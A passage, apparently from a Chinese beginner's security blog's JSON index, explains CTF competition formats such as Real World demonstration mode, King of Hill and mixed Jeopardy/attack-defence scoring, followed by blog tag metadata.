举个例子。题目要求需要攻击位于比赛网络中的某个网站并将首页替换为包含队伍名称的页面。题目给出该网站的一些信息(源代码/数据库等等)，选手经过本地挖掘漏洞之后，提交展示申请，排期到了之后进行上台展示。注意，因为RW模式是以展示效果来作为题目是否完成的准则，所以在RW模式中并不存在Flag。 KoH-抢占山头​ King of Hill(KoH)是近些年新衍生的一种赛制。该赛制有点类似于AwD，但是又和AwD有些不一样。选手面对的是一个黑盒的目标，需要先挖掘漏洞并利用漏洞控制目标。将自己的队伍标识(队伍名称或是Token之类)写入到指定文件。随后在该主机上进行加固等操作防止其他队伍攻击，主办方会定期去检查标识文件，根据文件中的队伍标识来判定本回合分数给予哪个队伍。可以看出KoH也是一种对抗极为激烈的赛制，同时考察选手的渗透能力及防御加固能力。 Mix-混合​ 混合模式结合了以上多种模式，现如今单一的赛制已经无法满足比赛及选手的参赛需求，所以大部分比赛会同时以多个模式进行比赛。例如参赛队伍通过解题(Jeopardy)可以获取一些初始分数，然后通过攻防对抗(AwD)进行得分增减的零和游戏，最终以得分高低分出胜负。","categories":[],"tags":[{"name":"萌新","slug":"萌新","permalink":"https://0410wzn.top/tags/%E8%90%8C%E6%96%B0/"}]}],"categories":[],"tags":[{"name":"人生苦短，我学pwn","slug":"人生苦短，我学pwn","permalink":"https://0410wzn.top/tags/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%EF%BC%8C%E6%88%91%E5%AD%A6pwn/"},{"name":"MISC","slug":"MISC","permalink":"https://0410wzn.top/tags/MISC/"},{"name":"人生苦短，我学Pwn","slug":"人生苦短，我学Pwn","permalink":"https://0410wzn.top/tags/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%EF%BC%8C%E6%88%91%E5%AD%A6Pwn/"},{"name":"Linux命令入门","slug":"Linux命令入门","permalink":"https://0410wzn.top/tags/Linux%E5%91%BD%E4%BB%A4%E5%85%A5%E9%97%A8/"},{"name":"入门","slug":"入门","permalink":"https://0410wzn.top/tags/%E5%85%A5%E9%97%A8/"},{"name":"萌新","slug":"萌新","permalink":"https://0410wzn.top/tags/%E8%90%8C%E6%96%B0/"}]}